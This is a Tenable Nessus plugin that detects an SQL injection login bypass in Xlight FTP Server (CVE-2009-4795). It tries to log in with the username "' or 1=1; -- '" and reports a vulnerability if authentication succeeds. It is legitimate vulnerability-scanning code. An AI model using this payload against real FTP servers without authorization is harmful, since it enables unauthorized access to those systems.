#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(36051);
  script_version("$Revision: 1.17 $");
  script_cvs_date("$Date: 2016/05/05 16:01:16 $");

  script_cve_id("CVE-2009-4795");
  script_bugtraq_id(34288);
  script_osvdb_id(52997);
  script_xref(name:"Secunia", value:"34513");

  script_name(english:"Xlight FTP Server Authentication SQL Injection");
  script_summary(english:"Attempts to use SQL injection to login.");

  script_set_attribute(
    attribute:"synopsis",
    value:"The remote FTP is affected by a SQL injection vulnerability."
  );
  script_set_attribute( attribute:"description", value:
"The version of Xlight FTP installed on the remote host is vulnerable to
a SQL injection attack during login. This allows an attacker to execute
arbitrary SQL commands in the context of the FTP server.

Installations that are not using external ODBC authentication are not
affected by this vulnerability."  );
  script_set_attribute(
    attribute:"see_also",
    value:"http://www.xlightftpd.com/whatsnew.htm"
  );
  script_set_attribute(
    attribute:"solution",
    value:"Upgrade to version 3.2.1 or later."
  );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  
  script_set_attribute(attribute:"plugin_publication_date", value: "2009/03/31");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"FTP");

  script_copyright(english:"This script is Copyright (C) 2009-2016 Tenable Network Security, Inc.");

  script_dependencies("find_service2.nasl", "ftpserver_detect_type_nd_version.nasl");
  script_exclude_keys("global_settings/supplied_logins_only");
  script_require_ports("Services/ftp", 21);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("ftp_func.inc");

user = "' or 1=1; -- '";
pass = "nessus";

port = get_ftp_port(default:21);
if (supplied_logins_only) audit(AUDIT_SUPPLIED_LOGINS_ONLY);

# Unless we're paranoid, make sure the banner looks like Xlight
# before proceeding
if(report_paranoia < 2)
{
  banner = get_ftp_banner(port:port);

  if(!egrep(pattern:"xlight (ftp )?server", string:tolower(banner)))
    audit(AUDIT_NOT_LISTEN, 'Xlight FTP', port);
}

soc = open_sock_tcp(port);
if(!soc) audit(AUDIT_SOCK_FAIL, port);

if(ftp_authenticate(socket:soc, user:user, pass:pass))
{
    ftp_close(socket:soc);

    if (report_verbosity > 0)
    {
      report = string(
        "\n",
        "Nessus was able to log into the FTP server using the\n",
        "following credentials :\n\n",
        "  username : ", user, "\n",
        "  password : ", pass, "\n"
      );

      security_hole(port:port, extra:report);
    }
    else security_hole(port:port);
    exit(0);
}
ftp_close(socket:soc);
audit(AUDIT_LISTEN_NOT_VULN, 'FTP Server', port);
